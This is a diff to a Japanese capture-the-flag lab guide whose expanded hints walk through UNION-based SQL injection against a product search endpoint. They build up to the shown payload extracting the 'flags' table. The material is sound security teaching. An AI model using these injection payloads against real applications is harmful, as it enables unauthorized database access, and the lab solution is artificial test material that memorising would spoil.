@@ -11,23 +11,60 @@
 
 <details><summary>ヒント1</summary>
 
-`server.py`の`/search`エンドポイントを見ろ。`?q=`の値はどう組み込まれている?
+まず普通に商品を検索しろ。`Widget`なら商品が見つかり、存在しない`zzz`なら「該当なし」に
+なる。
+
+次に`server.py`の`/search`エンドポイントを見ろ。`?q=`の値はどのSQLへ組み込まれている?
 
 </details>
 
 <details><summary>ヒント2</summary>
 
-`q`は`LIKE '%...%'`の中にそのまま埋め込まれる。試しに`q`に`'`(シングルクォート)を1つだけ
-送ってみろ。SQL構文エラーが返るはずだ → クォートを自分で閉じて、続きに好きなSQLを足せる
-状態になっている。
+`q`は次のSQLの`...`へそのまま入る。
+
+```sql
+SELECT id, name, description, price FROM products
+WHERE name LIKE '%...%'
+```
+
+`q`へ`'`を1つだけ送ってみろ。SQL構文エラーになれば、入力したクォートがSQLのクォートとして
+解釈されている。
 
 </details>
 
 <details><summary>ヒント3</summary>
 
-`products`は4カラムなので、混ぜ込む`UNION SELECT`も4つの値を返す必要がある。型が違う
-カラムには`NULL`を入れれば型エラーを回避できる(例: `UNION SELECT 1,'a','b',1`で試して
-エラーが出ないか確認する)。
+クォートを閉じた後は、サーバーが付ける末尾の`%'`が邪魔になる。次を送り、末尾をコメントに
+できることを確認しろ。
+
+```text
+zzz'-- -
+```
+
+MySQLの`--`コメントは、直後に半角スペースが必要だ。最後の`-`は、そのスペースを見失わない
+ための目印にすぎない。
+
+</details>
+
+<details><summary>ヒント4</summary>
+
+別のSELECT結果を足すには`UNION SELECT`を使う。ただし、元のSELECTと同じ数の値を返す必要が
+ある。検索結果は`id, name, description, price`の4カラムなので、まず固定値4つを混ぜてみろ。
+
+```text
+zzz' UNION SELECT 1,'test','union works',100-- -
+```
+
+`zzz`に一致する商品はないため、画面に出る1行は`UNION SELECT`で作ったものだ。
+
+</details>
+
+<details><summary>ヒント5</summary>
+
+固定値を表示できたら、その一部を`flags`テーブルの値へ置き換える。`flags`は`id, flag`の
+2カラムだが、UNION側も4つの値が必要だ。使わない位置は`NULL`で埋められる。
+
+商品名の位置は、4つのうち何番目だったか?
 
 </details>
 
@@ -46,7 +83,7 @@ WHERE name LIKE '%zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -%'
 
 分解すると:
 - `zzz` — 本来の検索語。適当な値でよく、存在しない商品名なので本来の検索結果は0件になる
-- `' `— LIKE句のクォートを閉じる
+- `'` — LIKE句のクォートを閉じる
 - `UNION SELECT id,flag,NULL,NULL FROM flags` — `flags`テーブルの行を、`products`と同じ
   4カラムの形(id, name, description, price)に変形して結果に追加する。`id,flag`は型が
   合うのでそのまま、残り2カラムは`NULL`で埋める
@@ -55,7 +92,7 @@ WHERE name LIKE '%zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -%'
 
 結果、検索結果に`flags`テーブルの行が紛れ込み、`name`カラムの位置にflagが表示される。
 
-### もっと自力で探したい場合
+### 発展: カラム数が明記されていない場合
 
 カラム数(4)を教えられずに解く場合は`ORDER BY`で探る:
 ```
